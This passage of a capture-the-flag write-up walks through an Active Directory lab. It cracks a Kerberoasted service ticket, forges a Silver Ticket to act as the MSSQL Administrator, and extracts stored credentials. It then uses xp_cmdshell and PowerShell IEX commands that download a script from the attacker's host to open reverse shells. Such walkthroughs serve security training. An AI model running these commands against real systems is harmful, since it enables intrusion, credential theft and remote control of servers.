</span></span><span style="display:flex;"><span>$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0</span></span></code></pre></div></p>
<h3 id="cracking-ticket-using-hashcat">Cracking Ticket Using Hashcat</h3>
<p>And now I&rsquo;ll try to crack this ticket using 

<a href="https://hashcat.net/hashcat/" target="_blank"><em>hachcat</em></a> and <em>rockyou.txt</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">13100</span> <span style="color:#e6db74">&#39;$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0&#39;</span> /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$38ac0e94da96e9299e64f23d20f88676$e2108160934493e1d8fb52858eb0b496de7803f86824345c8248901d01f29d72b4d70d7893ef49a2b1533b370713430e1425005bf94e0ccf8caa86b641cf79e6c505468ecfb10a0bbb92401e60d6e8e739415ac438710dabb4a91ff0f40717735588976685723d47511c4018ec60820beed32a2f0af6bb970781581c46afc1df4506058711c38a6892b615f4f71acd96cde456d8ad941cdb41957fbeaab2329ae86c952ee4a08c4240a26cdda138b72ee120a4476aaeb89974bc00afab02149b4b45deff940965e3182741ad128f5f4cb126557d4e6e5fff6cd4e929db656000296d8f1da9b8140563e1d655c3403e9af591b1d7842d4afaab1a0d38bc07eac84dbea11ac57c7b6f60af3fa23cdcf102813add3109b34738d10251731933de08f26f9dde27483a90f557644b1bcffd7f9d66f4bad2881f379be926d95ac3ef42c71eb7423dcbc06ea3b4977b119cb9ea29579e8da48b23d8414268488bd0160dffa75c77349fdbdbd615fc2c2011b9ec3a1f4af34e953d026c66b71456b7688a01473c8f8b3feccec7bfe1704f031a5ed5ae1ac654a8652e2bf7c9bb365c01d23fba38a6dcbd4cd62dbf0fd6d102a403fb5f0beb5e05132f7684ff73e8d3f34111d7bd2b313c8b7cf09df19d98c40235d9a825b5a084f65ba14cb10c78c404e159b4976cd081835d627fba402877285cc9dba95a37069cb85d79e49f129ac45f3cc1b819a61e84beeebaebfd6ed87d8a8ddeef31d953050692bf5fde183e28fb96c3dac626e7d9ec7e87d860b319b8995bc485e18be089e19f2500f1d209c43880146b9381f33d36d659219a061596feaed3d6a97602bc823c256e635bbb3eeaa708e5365006d97570dccc71fae7e0d08aaab633ee03ce96a2650628f9e7715ae90b5a5b0e9221ae6a2bf88907ac9aaa0a534b09799b0261787d77c9ccb74cdcfe07e840e1dcbcd6c5eb64976ce3abed14c2e92c3754daf3941009a60652822e03346a7ad5ca4a3766ea68fa8edd8968bfe1d98a069a064e41926e762bc1c6abb3e2a57c87505ef9d377b1fc5fdea5e7b0af4de5ccaaa4ee78548a7e0f19e9a28c34d18285c1c792cd481b7867ad45b5e15035e368f3e2735d0bf66fe5427943115f08ab3ef186c2169a7c305ae48b61180d4ef1d51e3179d181fb97be3c6b26ca8419f6680d714b45c96ae443e3ea8bcd319045847a2db3e2942082805540bb39c790a535e992e9f4f860922bdaeb181680f1366c9d0119ccd97d02fa18aae5af9138990771bcd25da4356c31896f6b471393da256c0f64d86851e6705ba68298711a21cc039f98139056813d1ebb4dd43085e68668a31c76e0935c8146eb490260614a58786816cc63530bd6cb9034b646e359647e61b650fd73f10839feb4b8c92a8d58c8c7ab604b07a0cd86aaab0e4586231fc74abf0e3ca0:Pegasus60
</span></span><span style="display:flex;"><span>    ...</span></span></code></pre></div>
<h2 id="silver-ticket-attack">Silver Ticket Attack</h2>
<p>The password for this SQL service is <em>Pegasus60</em>, so I can now use a 

<a href="https://youtu.be/_nJ-b1UFDVM" target="_blank"><em>Silver Ticket Attack</em></a> against this service and pretend to be the Administrator.</p>
<ul>
<li>
<p>First, I need to get the <em>NTLM hash</em> for this password which is required by <em>impacket-ticketer.py</em> script. I can do that using an online NTLM hash generator like 

<a href="https://tobtu.com/lmntlm.php" target="_blank"><em>tobtu</em></a> for example.
<img src="generating-ntlm-hash-for-silver-ticket-attack.png" alt="NTLM Hash generation for Silver Ticket Attack"></p>
</li>
<li>
<p>Next, I need to get the SID of the domain. There are plenty of ways, using <em>LDAP</em> for example, but the simplest one is to use <em>impacket-secrectsdump.py</em> with the <em>-debug</em> option since I am on linux:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/secretsdump.py scrm.local/ksimpson:ksimpson@dc1.scrm.local -k -no-pass -debug
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calling DRSCrackNames <span style="color:#66d9ef">for</span> S-1-5-21-2743207045-1827831105-2542523200-500 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calling DRSGetNCChanges <span style="color:#66d9ef">for</span> <span style="color:#f92672">{</span>edaf791f-e75b-4711-8232-3cd66840032a<span style="color:#f92672">}</span> 
</span></span><span style="display:flex;"><span>    Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>        File <span style="color:#e6db74">&#34;/opt/impacket/build/scripts-3.10/secretsdump.py&#34;</span>, line 230, in dump
</span></span><span style="display:flex;"><span>            self.__NTDSHashes.dump<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    ...</span></span></code></pre></div>
It does not really matter if I get an error, the important thing is that I got the domain SID <em>S-1-5-21-2743207045-1827831105-2542523200</em> (without <em>-500</em> which is the RID)</p>
</li>
<li>
<p>Finally, I can request a <em>Silver Ticket</em> using <em>impacket-ticketer.py</em>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/ticketer.py -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -user ksimpson -password ksimpson Administrator
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating basic skeleton ticket and PAC Infos
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Customizing ticket <span style="color:#66d9ef">for</span> scrm.local/Administrator
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_LOGON_INFO
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_CLIENT_INFO_TYPE
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncAsRepPart
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Signing/Encrypting final ticket
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_SERVER_CHECKSUM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	PAC_PRIVSVR_CHECKSUM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncTicketPart
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 	EncASRepPart
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saving ticket in Administrator.ccache</span></span></code></pre></div></p>
</li>
</ul>
<h2 id="interacting-with-sql-server-as-administrator">Interacting with SQL Server As Administrator</h2>
<p>Now I can export the ticket like I did before, and interact with the SQL service pretending to be the Administrator:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ export KRB5CCNAME<span style="color:#f92672">=</span>Administrator.ccache
</span></span><span style="display:flex;"><span>$ python3 /opt/impacket/build/scripts-3.10/mssqlclient.py scrm.local -k -no-pass
</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
</span></span><span style="display:flex;"><span>SQL&gt; </span></span></code></pre></div></p>
<h3 id="enumerating-the-database">Enumerating the Database</h3>
<p>I&rsquo;ll enumerate databases looking for some credentials:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; SELECT name FROM master.dbo.sysdatabases
</span></span><span style="display:flex;"><span>name                                                                                                                               
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------------------------------------------------------   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>master                                                                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tempdb                                                                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model                                                                                                                              
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msdb                                                                                                                               
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ScrambleHR                                                                                                                         
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQL&gt; use ScrambleHR;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: ScrambleHR
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;ScrambleHR&#39;</span>.
</span></span><span style="display:flex;"><span>SQL&gt; SELECT  * FROM INFORMATION_SCHEMA.TABLES;
</span></span><span style="display:flex;"><span>TABLE_CATALOG    TABLE_SCHEMA    TABLE_NAME     TABLE_TYPE   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-------------   --------------   -----------   ------------   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ScrambleHR          dbo           Employees     b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ScrambleHR          dbo           UserImport    b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ScrambleHR          dbo           Timesheets    b<span style="color:#e6db74">&#39;BASE TABLE&#39;</span>   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQL&gt; <span style="color:#66d9ef">select</span> * from UserImport;
</span></span><span style="display:flex;"><span>LdapUser     LdapPwd                  LdapDomain     RefreshInterval   IncludeGroups   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---------   ---------------------   --------------   ---------------   -------------   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MiscSvc      ScrambledEggs9900       scrm.local          <span style="color:#ae81ff">90</span>                  <span style="color:#ae81ff">0</span>   </span></span></code></pre></div></p>
<p>Looks like I got new Creds <em>MiscSvc:ScrambledEggs9900</em>.</p>
<h3 id="getting-reverse-via-xp_cmdshell">Getting Reverse via xp_cmdshell</h3>
<p>Since I have Administrative privileges on the SQL service, I can try to enable <em>xp_cmdshell</em> and then execute commands that way. The process is very simple using 

<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" target="_blank"><em>impacket-mssqlclient.py</em></a>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; enable_xp_cmdshell
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC1<span style="color:#f92672">)</span>: Line 185: Configuration option <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> changed from <span style="color:#ae81ff">0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span style="display:flex;"><span>SQL&gt; xp_cmdshell whoami
</span></span><span style="display:flex;"><span>output                                                                             
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------------------------------------------------------------------   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\s</span>qlsvc                                                                        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NULL                                                                               </span></span></code></pre></div></p>
<p>Since I have credentials for <em>MiscSvc</em>, a simple way to escalate to that user from this, is via powershell by creating a <em>New PSCredential Object</em>, but I need first to get a <em>proper shell</em>. I&rsquo;ll use 

<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank"><em>Invoke-PowerShellTcp.ps1</em></a> from 

<a href="https://github.com/samratashok/nishang" target="_blank"><em>Nishang</em></a> project.</p>
<ul>
<li>
<p>First, I&rsquo;ll copy 

<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank"><em>Invoke-PowerShellTcp.ps1</em></a> to my current directory and append at the end of this script the following line:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.59 -Port <span style="color:#ae81ff">8989</span></span></span></code></pre></div></p>
</li>
<li>
<p>Next, I&rsquo;ll open a webserver on port <em>8000</em>, and listen for reverse shell connection on port <em>8989</em>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...</span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8989</span> ...</span></span></code></pre></div></p>
</li>
<li>
<p>Then, I&rsquo;ll use <em>powershell IEX</em> expression to load the script directly into RAM from my server without installing anything or touching the disk:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>SQL&gt; xp_cmdshell <span style="color:#e6db74">&#34;powershell IEX (New-Object Net.WebClient).DownloadString(\&#34;http://10.10.16.59:8000/Invoke-PowerShellTcp.ps1\&#34;);&#34;</span></span></span></code></pre></div>
<img src="getting-reverse-shell-as-sqlsvc.png" alt="Getting Reverse Shell as sqlvc"></p>
</li>
</ul>
<h3 id="switching-to-miscsvc-user-and-getting-usertxt">Switching to MiscSvc User and Getting user.txt</h3>
<p>In order to switch to <em>MiscSvc</em> user I&rsquo;ll use <em>New PSCredential Object</em> and <em>Invoke-Command</em> which are built in command from powershell:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; $pass <span style="color:#f92672">=</span> ConvertTo-SecureString <span style="color:#e6db74">&#34;ScrambledEggs9900&#34;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; $cred <span style="color:#f92672">=</span> New-Object System.Management.Automation.PSCredential <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;scrm.local\MiscSvc&#34;</span>, $pass<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; Invoke-Command -ComputerName dc1.scrm.local -Credential $cred <span style="color:#f92672">{</span>whoami<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\m</span>iscsvc</span></span></code></pre></div></p>
<p>Now I am able to execute commands as <em>MiscSvc</em>, so I&rsquo;ll get another reverse shell as that user using the same technique, but I need to change the port number in the last line of 

<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank"><em>Invoke-PowerShellTcp.ps1</em></a>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.59 -Port <span style="color:#ae81ff">8990</span></span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Invoke-Command -ComputerName dc1.scrm.local -Credential $cred <span style="color:#f92672">{</span>IEX <span style="color:#f92672">(</span>New-Object Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://10.10.16.59:8000/Invoke-PowerShellTcp.ps1&#34;</span><span style="color:#f92672">)}</span></span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8990</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8990</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.59<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.168<span style="color:#f92672">]</span> <span style="color:#ae81ff">49552</span>
</span></span><span style="display:flex;"><span>Windows PowerShell running as user miscsvc on DC1
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\D</span>ocuments&gt;whoami
</span></span><span style="display:flex;"><span>scrm<span style="color:#ae81ff">\m</span>iscsvc
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>iscsvc<span style="color:#ae81ff">\D</span>ocuments&gt; cat ..<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt       
</span></span><span style="display:flex;"><span>39d**************************399</span></span></code></pre></div></p>
<ul>
<li>Notice here I used <em>IEX</em> expression directly without <em>powershell</em> command before it, otherwise it will throw an error because <em>Invoke-Command</em> already uses powershell as its interpreter not cmd.</li>
</ul>
<h2 id="post-enumeration">Post Enumeration</h2>
<p>After enumerating a little bit, I was looking for the custom application listening on port <em>4411</em>:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares&gt; netstat -ano | Select-String LISTENING
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    TCP    0.0.0.0:4411           0.0.0.0:0              LISTENING       <span style="color:#ae81ff">3116</span>
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\S</span>hares&gt; Get-Process -Id <span style="color:#ae81ff">3116</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Handles  NPM<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>    PM<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>      WS<span style="color:#f92672">(</span>K<span style="color:#f92672">)</span>     CPU<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>     Id  SI ProcessName                                                  
</span></span><span style="display:flex;"><span>-------  ------    -----      -----     ------     --  -- -----------                                                  
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">439</span>      <span style="color:#ae81ff">15</span>    <span style="color:#ae81ff">17984</span>      <span style="color:#ae81ff">19940</span>              <span style="color:#ae81ff">3116</span>   <span style="color:#ae81ff">0</span> ScrambleServer                                               </span></span></code></pre></div>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files&gt; dir
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    d-----       03/11/2021     20:49                ScrambleCorp
</span></span><span style="display:flex;"><span>    ...
